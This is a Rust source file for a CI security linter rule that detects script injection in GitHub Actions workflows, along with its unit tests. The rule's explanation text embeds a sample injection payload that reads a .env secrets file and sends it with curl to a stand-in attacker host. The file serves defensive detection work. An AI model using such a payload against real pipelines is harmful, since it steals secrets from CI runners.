//! R01 — Script injection via untrusted context. **CRITICAL.**
//!
//! A `run:` step that interpolates attacker-controlled event data
//! (`github.event.issue.title`, `github.event.pull_request.body`, …)
//! directly into a shell command lets a fork or issue author execute
//! arbitrary code on the runner with every secret in the environment.
//!
//! The fix is always the same shape: bind the value to an `env:` variable
//! and reference `"$VAR"` — the shell never re-expands the variable's
//! contents as syntax.

use crate::expressions;
use crate::finding::{Finding, RuleId};
use crate::model::Step;
use crate::rules::RuleContext;
use crate::severity::Severity;

pub struct ScriptInjection;

impl crate::rules::Rule for ScriptInjection {
    fn id(&self) -> RuleId {
        RuleId::ScriptInjection
    }

    fn evaluate<'a>(&self, ctx: &RuleContext<'a>) -> Vec<Finding> {
        let mut findings = Vec::new();
        for job in &ctx.workflow.jobs {
            for step in &job.steps {
                let Step::Run { script, .. } = step else {
                    continue;
                };
                // Find the first untrusted expression — it anchors the message.
                let exprs = expressions::extract(script);
                let Some(bad) = exprs.iter().find(|e| expressions::is_untrusted(e.text)) else {
                    continue;
                };
                findings.push(Finding {
                    rule: RuleId::ScriptInjection,
                    severity: Severity::Critical,
                    file: ctx.path.to_path_buf(),
                    line: ctx.find_line(first_nonempty_line(script)),
                    job: Some(job.id.clone()),
                    message: format!(
                        "run step interpolates untrusted context `${{ {} }}`",
                        bad.text
                    ),
                    explanation: concat!(
                        "Event fields like issue titles and PR bodies are fully ",
                        "attacker-controlled. A value such as ",
                        "`\"; curl attacker.com/exfil?data=$(cat .env | base64) #` ",
                        "becomes shell syntax in the CI runner with secrets available."
                    )
                    .to_owned(),
                    fix: concat!(
                        "Bind the value to an env var, then reference it:\n",
                        "  env:\n",
                        "    TITLE: ${{ github.event.issue.title }}\n",
                        "  run: echo \"$TITLE\""
                    )
                    .to_owned(),
                });
            }
        }
        findings
    }
}

/// First non-empty line of a script, used to anchor the finding's line.
fn first_nonempty_line(script: &str) -> &str {
    script.lines().find(|l| !l.trim().is_empty()).unwrap_or("")
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::input::ParsedWorkflow;
    use crate::parse::parse_workflow;
    use crate::rules::Rule;
    use std::path::PathBuf;

    fn evaluate(raw: &str) -> Vec<Finding> {
        let model = parse_workflow(raw).unwrap();
        let parsed = ParsedWorkflow::new(PathBuf::from("w.yml"), raw.to_owned(), model);
        let config = crate::config::Config::default();
        ScriptInjection.evaluate(&RuleContext {
            workflow: &parsed.model,
            path: &parsed.path,
            config: &config,
            raw: &parsed.raw,
        })
    }

    #[test]
    fn flags_issue_title_in_run() {
        let f = evaluate(
            "on: issues\njobs:\n  b:\n    steps:\n      - run: echo \"${{ github.event.issue.title }}\"\n",
        );
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].line, Some(5));
    }

    #[test]
    fn flags_pr_body_in_run() {
        let f = evaluate(
            "on: pull_request\njobs:\n  b:\n    steps:\n      - run: curl -d \"${{ github.event.pull_request.body }}\"\n",
        );
        assert_eq!(f.len(), 1);
    }

    #[test]
    fn ignores_trusted_context() {
        let f = evaluate(
            "on: push\njobs:\n  b:\n    steps:\n      - run: echo \"${{ github.repository }}\"\n",
        );
        assert!(f.is_empty());
    }

    #[test]
    fn ignores_env_var_pattern() {
        let f = evaluate(
            "on: issues\njobs:\n  b:\n    env:\n      T: ${{ github.event.issue.title }}\n    steps:\n      - run: echo \"$T\"\n",
        );
        assert!(f.is_empty());
    }
}
